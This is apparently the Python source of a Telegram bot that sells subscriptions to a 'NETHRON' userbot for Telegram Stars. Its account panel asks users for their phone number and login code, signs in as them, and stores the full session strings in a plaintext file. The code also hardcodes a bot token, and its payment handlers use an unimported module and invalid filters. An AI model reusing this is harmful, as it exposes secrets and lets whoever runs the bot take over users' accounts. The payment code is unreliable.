import os, sys, asyncio, glob, importlib.util, __main__, subprocess, random, string, json
from telethon import TelegramClient, events, Button, types
from telethon.sessions import StringSession
from datetime import datetime, timedelta
from dateutil.relativedelta import relativedelta
from config import api_id, api_hash

# --- الإعدادات الأساسية ---
BOT_TOKEN = "8136996400:AAEO4uDFUweXXiz49bs91hI_jmvBqh8CStI"
DB_FILE = "nethron_vips.json"  # ملف تخزين المشتركين والأكواد
DEV_ID = "@NETH_RON"
DEV2_ID = "@xxnnxg"

bot = TelegramClient('MakerBot', api_id, api_hash).start(bot_token=BOT_TOKEN)

# دالة لقراءة وكتابة البيانات
def load_db():
    if not os.path.exists(DB_FILE):
        return {"users": {}, "codes": {}}
    return json.load(open(DB_FILE, "r"))

def save_db(data):
    json.dump(data, open(DB_FILE, "w"), indent=4)

# دالة توليد كود (30D_NETHRON_XXXXXX)
def generate_nethron_code(days):
    rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    return f"{days}D_NETHRON_{rand}"

# ==========================================
# 1. الترحيب والقائمة الرئيسية
# ==========================================
@bot.on(events.NewMessage(pattern=r"/start"))
async def start(event):
    db = load_db()
    uid = str(event.sender_id)
    status = "غير مشترك ❌"
    if uid in db["users"]:
        exp = datetime.fromisoformat(db["users"][uid])
        if exp > datetime.now():
            status = f"مشترك ✅ (ينتهي: {exp.strftime('%Y-%m-%d')})"
    
    msg = (
        "★────────☭────────★\n"
        "   ☭ • **𝑆𝑂𝑈𝑅𝐶𝐸 𝑁𝐸𝑇𝐻𝑅𝑂𝑁 𝑉𝐼𝑃** • ☭\n"
        "★────────☭────────★\n\n"
        f"👤 **حالتك:** {status}\n\n"
        "مرحباً بك في نظام التنصيب التلقائي المدفوع.\n"
        "يمكنك شراء الاشتراك بالنجوم وتفعيل السورس فوراً.\n\n"
        "➥ 𝑫𝑬𝑽 : " + DEV_ID + "\n"
        "➥ 𝑨𝑫𝑴𝑰𝑵 : " + DEV2_ID + "\n"
        "★────────☭────────★"
    )
    buttons = [
        [Button.inline("🌟 تنصيب مباشر (15⭐)", b"pay_direct")],
        [Button.inline("🔑 شراء كود تفعيل", b"buy_menu")],
        [Button.inline("🎟️ تفعيل كود", b"use_code")],
        [Button.inline("📱 لوحة التنصيب /P", b"open_panel")]
    ]
    await event.respond(msg, buttons=buttons)

# ==========================================
# 2. معالج الدفع والاشتراكات
# ==========================================
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode()
    uid = str(event.sender_id)
    db = load_db()

    if data == "buy_menu":
        btns = [
            [Button.inline("شهر (15⭐)", b"pay_30"), Button.inline("شهرين (25⭐)", b"pay_60")],
            [Button.inline("⬅️ رجوع", b"back")]
        ]
        await event.edit("💎 **اختر مدة الاشتراك لإنشاء كود التفعيل:**", buttons=btns)

    elif data.startswith("pay_"):
        days = int(data.split("_")[1])
        price = 15 if days == 30 else 25
        
        # إرسال فاتورة نجوم حقيقية
        invoice = types.InputMediaInvoice(
            title=f"اشتراك نيثرون {days} يوم",
            description=f"تفعيل السورس المدفوع لمدة {days} يوم",
            invoice_payload=f"pay_{days}_{uid}",
            provider="", # يترك فارغ للنجوم
            currency="XTR", # رمز النجوم
            prices=[types.LabeledPrice(label="النجوم", amount=price)],
            start_param="nethron_vip"
        )
        await bot.send_message(event.chat_id, "📥 **اضغط على الزر أدناه لإتمام الدفع بالنجوم:**", file=invoice)

    elif data == "use_code":
        async with bot.conversation(event.chat_id) as conv:
            m = await conv.send_message("🎟️ **أرسل كود التفعيل الخاص بك:**")
            code_msg = await conv.get_response()
            code = code_msg.text.strip()
            
            if code in db["codes"]:
                days = db["codes"][code]["days"]
                expiry = datetime.now() + timedelta(days=days)
                db["users"][uid] = expiry.isoformat()
                del db["codes"][code] # الكود يستعمل مرة واحدة
                save_db(db)
                await conv.send_message(f"🎉 **تم التفعيل بنجاح لمدة {days} يوم!**\nاكتب الآن `/P` للبدء.")
            else:
                await conv.send_message("❌ **الكود غير صحيح أو مستخدم سابقاً!**")

    elif data == "open_panel":
        await event.delete()
        await control_panel(event)

# ==========================================
# 3. التحقق من الدفع وتوليد الكود
# ==========================================
@bot.on(events.Raw(types.UpdateBotPrecheckoutQuery))
async def precheckout(event):
    await bot(functions.messages.SetBotPrecheckoutResultsRequest(
        query_id=event.query_id,
        success=True
    ))

@bot.on(events.Raw(types.UpdateBotStopped)) # في حال نجاح الدفع
@bot.on(events.NewMessage(filter=events.MessageActionPaymentSentMe))
async def payment_success(event):
    db = load_db()
    payload = event.action.payload.decode() # pay_30_ID
    days = int(payload.split("_")[1])
    uid = payload.split("_")[2]
    
    new_code = generate_nethron_code(days)
    db["codes"][new_code] = {"days": days, "created_at": datetime.now().isoformat()}
    save_db(db)
    
    await bot.send_message(int(uid), 
        f"✅ **تم استلام الدفع بنجاح!**\n\nكود التفعيل الخاص بك هو:\n`{new_code}`\n\nاستخدم زر 'تفعيل كود' لبدء التنصيب.")

# ==========================================
# 4. لوحة التنصيب /P
# ==========================================
@bot.on(events.NewMessage(pattern=r"/P"))
async def control_panel(event):
    db = load_db()
    uid = str(event.sender_id)
    
    if uid not in db["users"] or datetime.fromisoformat(db["users"][uid]) < datetime.now():
        return await event.respond("⚠️ **عذراً، يجب عليك الاشتراك أولاً لاستخدام هذه اللوحة.**")

    msg = (
        "⚙️ **لوحة تنصيب سورس نيثرون الفخمة**\n"
        "★────────☭────────★\n"
        "➥ 𝑫𝑬𝑽 : " + DEV_ID + "\n"
        "➥ 𝑨𝑫𝑴𝑰𝑵 : " + DEV2_ID + "\n"
        "★────────☭────────★"
    )
    buttons = [
        [Button.inline("➕ إضافة حساب جديد", b"add_account")],
        [Button.inline("📊 عدد الحسابات", b"status_acc")],
        [Button.url("📢 قناة السورس", "https://t.me/NETH_RON")]
    ]
    await event.respond(msg, buttons=buttons)

@bot.on(events.CallbackQuery(data=b"add_account"))
async def add_acc(event):
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📱 **أرسل رقم الهاتف مع رمز الدولة:**\nمثال: `+96477XXXXXXXX`")
        p_res = await conv.get_response()
        phone = p_res.text.strip().replace(" ", "")
        
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        try:
            sent_code = await client.send_code_request(phone)
            await conv.send_message("📥 **أرسل الكود الذي وصلك (ضع مسافات بين الأرقام):**")
            c_res = await conv.get_response()
            # تنظيف الكود من المسافات
            clean_code = c_res.text.replace(" ", "")
            await client.sign_in(phone, clean_code)
            
            session_str = client.session.save()
            with open("database.txt", "a") as f:
                f.write(f"{session_str}\n")
            
            await conv.send_message("✅ **تم ربط وتنصيب الحساب بنجاح!**\nالسورس يعمل الآن على حسابك.")
        except Exception as e:
            await conv.send_message(f"❌ **خطأ:** `{str(e)}`")

@bot.on(events.CallbackQuery(data=b"status_acc"))
async def status_acc(event):
    with open("database.txt", "r") as f:
        count = len(f.readlines())
    await event.answer(f"📊 عدد الحسابات المتصلة: {count}", alert=True)
